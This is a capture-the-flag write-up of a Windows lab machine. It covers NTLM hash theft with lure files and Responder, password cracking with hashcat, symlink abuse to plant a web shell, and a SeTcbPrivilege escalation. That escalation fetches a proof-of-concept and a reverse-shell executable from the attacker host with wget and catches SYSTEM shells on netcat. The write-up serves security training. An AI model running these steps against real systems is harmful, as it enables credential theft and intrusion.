## Media

### Lab Details 

- Difficulty: Medium
- Type: SeTcbPrivilege, Active Directory, Windows
#### Enumeration
![[Medium/Media/upload form.png]]
#### Initial Foothold 
```bash
$ git clone https://github.com/Greenwolf/ntlm_theft.git
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 135, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 135 (delta 13), reused 8 (delta 3), pack-reused 107 (from 1)
Receiving objects: 100% (135/135), 2.12 MiB | 7.11 MiB/s, done.
Resolving deltas: 100% (61/61), done.
```
- generate the malicious files
```bash
$ python3 ntlm_theft.py -g all -s 10.10.14.66 -f media
<...SNIP...>
Created: media/media.wax (OPEN)
Created: media/media.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: media/media.asx (OPEN)
$ ls media/
 Autorun.inf                 'media-(fulldocx).xml'          media.library-ms               media.scf
 desktop.ini                 'media-(handler).htm'           media.lnk                     'media-(stylesheet).xml'
 media.application            media.htm                      media.m3u                      media.theme
 media.asx                   'media-(icon).url'              media.pdf                     'media-(url).url'
'media-(externalcell).xlsx'  'media-(includepicture).docx'  'media-(remotetemplate).docx'   media.wax
'media-(frameset).docx'       media.jnlp                     media.rtf                      zoom-attack-instructions.txt
```
- responder
```bash
[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:58c3861d4819ce0a:D91824BA57A7B1077184A05D6B981CCE:010100000000000080C91E2D4A38DC0196941E9B658C84B000000000020008004D0055004E00560001001E00570049004E002D0055004800590037003600570031004B0043004700570004003400570049004E002D0055004800590037003600570031004B004300470057002E004D0055004E0056002E004C004F00430041004C00030014004D0055004E0056002E004C004F00430041004C00050014004D0055004E0056002E004C004F00430041004C000700080080C91E2D4A38DC0106000400020000000800300030000000000000000000000000300000D3C9CC83EB241D56A1DCD9524638FDC6ED704DE6707881E12D88EB8CFC4110BC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380032000000000000000000
```
- hashcat 
```bash
$ hashcat -m 5600 hash  /usr/share/wordlists/rockyou.txt 

ENOX::MEDIA:58c3861d4819ce0a:d91824ba57a7b1077184a05d6b981cce:010100000000000080c91e2d4a38dc0196941e9b658c84b000000000020008004d0055004e00560001001e00570049004e002d0055004800590037003600570031004b0043004700570004003400570049004e002d0055004800590037003600570031004b004300470057002e004d0055004e0056002e004c004f00430041004c00030014004d0055004e0056002e004c004f00430041004c00050014004d0055004e0056002e004c004f00430041004c000700080080c91e2d4a38dc0106000400020000000800300030000000000000000000000000300000d3c9cc83eb241d56a1dcd9524638fdc6ed704de6707881e12d88eb8cfc4110bc0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00380032000000000000000000:1234virus@
```
#### Lateral Movement (If any)
- checking the directory serving the web app
```powershell
PS C:\xampp> ls .\htdocs\


    Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php


PS C:\xampp> tree .\htdocs\
Folder PATH listing
Volume serial number is 00000227 EAD8:5D48
C:\XAMPP\HTDOCS
+---assets
ª   +---img
ª       +---about
ª       +---logos
ª       +---portfolio
ª       +---team
+---css
+---js
PS C:\xampp> cd .\htdocs\
PS C:\xampp\htdocs> ls


    Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
```
- found the upload directory of the web app
```powershell
PS C:\xampp\htdocs> cat .\index.php
<?php
error_reporting(0);

    // Your PHP code for handling form submission and file upload goes here.
    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory
```
- logic here is that as user `enux` we are able to write to the upload directory `C:\Windows\Tasks\Uploads` thus we can create a symbolic link to `xampp` where the web app is hosted at, then we can write to the `xampp` directory 
- we can place a web shell in the `xampp` directory 
```powershell
PS C:\Windows\Tasks\Uploads> icacls.exe .\0f3e0bb311201721cf1cd2835ead31b5\
.\0f3e0bb311201721cf1cd2835ead31b5\ Everyone:(I)(OI)(CI)(F)
                                    BUILTIN\Administrators:(I)(F)
                                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                    NT AUTHORITY\SYSTEM:(I)(F)
                                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                    NT AUTHORITY\LOCAL SERVICE:(I)(F)
                                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\Windows\Tasks\Uploads> icacls.exe .\5e276e729116a62465003ed138ae4314\
.\5e276e729116a62465003ed138ae4314\ Everyone:(I)(OI)(CI)(F)
                                    BUILTIN\Administrators:(I)(F)
                                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                    NT AUTHORITY\SYSTEM:(I)(F)
                                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                    NT AUTHORITY\LOCAL SERVICE:(I)(F)
                                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```
- there are two directories in `Uploads` and their contents
```powershell
PS C:\Windows\Tasks\Uploads> tree . /F
Folder PATH listing
Volume serial number is 0000021F EAD8:5D48
C:\WINDOWS\TASKS\UPLOADS
ª   todo.txt
ª
+---0f3e0bb311201721cf1cd2835ead31b5
ª       media.wax ## malicious media file 
ª
+---5e276e729116a62465003ed138ae4314
        test
```
- at this point we still dont have write access to target directory however we can exploit this by using the upload function from website
![[upload form msg.png]]
- we get web shell in `C:\xampp\htdocs`
```powershell
PS C:\Windows\Tasks\Uploads\0f3e0bb311201721cf1cd2835ead31b5> ls


    Directory: C:\Windows\Tasks\Uploads\0f3e0bb311201721cf1cd2835ead31b5


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
-a----         10/9/2025   7:12 AM             35 webshell.php
```
- same as `C:\xampp\htdocs`
```powershell
PS C:\Windows\Tasks\Uploads\0f3e0bb311201721cf1cd2835ead31b5> ls C:\xampp\htdocs\


    Directory: C:\xampp\htdocs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/2/2023  10:27 AM                assets
d-----         10/2/2023  10:27 AM                css
d-----         10/2/2023  10:27 AM                js
-a----        10/10/2023   5:00 AM          20563 index.php
-a----         10/9/2025   7:12 AM             35 webshell.php
```
- access web shell at `http://10.129.234.67/webshell.php?cmd=whoami`
![[Pasted image 20251009071627.png]]
- send a reverse shell payload 
```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.234.67] 56018

PS C:\xampp\htdocs> whoami
nt authority\local service
```
#### Privilege Escalation
- check privileges 
```powershell
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State   
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```
- user has `SeTcbPrivilege` privilege
- search online and found post `https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e`
- [POC here](https://github.com/b4lisong/SeTcbPrivilege-Abuse/blob/main/TcbElevation-x64.exe)
- download the POC executable and reverse shell executable 
```powershell
PS C:\Windows\ServiceProfiles\LocalService> wget http://10.10.14.82:8000/TcbElevation-x64.exe -O TcbElevation-x64.exe
PS C:\Windows\ServiceProfiles\LocalService> wget http://10.10.14.82:8000/reverse_shell.exe -O reverse_shell.exe
```
- execute POC to get reverse shell
```powershell
PS C:\Windows\ServiceProfiles\LocalService> .\TcbElevation-x64.exe pEsc 'C:\Windows\ServiceProfiles\LocalService\reverse_shell.exe'
```
- reverse shell on `nc`
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.234.67] 56026
Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
#### Resources

#### Lesson Learned
